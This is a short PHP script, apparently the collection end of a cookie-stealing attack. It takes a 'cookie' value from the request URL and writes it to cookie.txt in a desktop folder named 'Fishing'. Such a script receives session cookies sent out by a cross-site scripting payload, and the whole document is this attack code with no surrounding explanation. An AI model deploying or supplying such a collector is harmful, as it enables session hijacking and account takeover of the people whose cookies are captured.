<?php
$cookie=$_GET[cookie]; 
$save_file=fopen("C:\Users\X0145765\Desktop\Fishing\cookie.txt", "w"); 
fwrite($save_file,$cookie); 
fclose($save_file); 
?>

